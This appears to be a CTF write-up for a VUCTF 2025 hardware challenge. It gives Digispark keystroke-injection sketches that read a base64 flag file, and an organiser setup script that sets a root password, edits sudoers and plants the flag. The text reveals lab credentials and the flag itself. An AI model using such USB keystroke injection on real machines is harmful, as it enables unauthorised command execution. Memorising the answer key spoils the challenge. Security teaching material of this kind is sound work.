## Airgapped
This is the easy hardware challenge part of the hardware challenge series during VUCTF 2025. 

Flash this script onto the digispark and insert it and read the flag from the screen:
```c
#include "DigiKeyboard.h"

void setup() {
  // empty setup
}

void send_keys(const char* command) {
  DigiKeyboard.delay(1000);
  DigiKeyboard.print(command);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
}

void loop() {
  // login tty
  //send_keys("vuctf");
  //send_keys("vuctf");

  send_keys("cat /home/vuctf/studsec/vuctf_2025/base64_secure_flag_v1.txt | base64 -d");
  
  // Infinite loop to stop execution
  for (;;) { /* empty loop */ }
}
```

## Setup script 
In case we need to recover a SD card which corrupted or brokedown somehow
```c
#include "DigiKeyboard.h"

void setup() {
  // empty setup
}

void send_keys(const char* command) {
  DigiKeyboard.delay(1000);
  DigiKeyboard.print(command);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
}

void loop() {
  // login to the tty 
  send_keys("vuctf");
  send_keys("vuctf");

  // Setup root password
  send_keys("sudo su");
  send_keys("passwd root");
  send_keys("studsec_VUctf_2025_H3rdw4re");
  send_keys("studsec_VUctf_2025_H3rdw4re");

  // remove user from sudoers and remove from ALL sudo rights
  send_keys("echo '#' > /etc/sudoers.d/010_pi-nopasswd");
  send_keys("deluser vuctf sudo");

  // plant the flag 
  send_keys("mkdir /home/vuctf/studsec && mkdir /home/vuctf/studsec/vuctf_2025 ");
  send_keys("echo 'VUCTF{D1g1sp3rk_k3ystr0kes_br34ch3d_A1rgaPPed_syst3ms}' | base64 > /home/vuctf/studsec/vuctf_2025/base64_secure_flag_v1.txt");
  send_keys("cat /home/vuctf/studsec/vuctf_2025/base64_secure_flag_v1.txt | base64 -d");

  // logout to apply changes
  send_keys("exit");
  send_keys("logout");

  // Infinite loop to stop execution
  for (;;) { /* empty loop */ }
}
```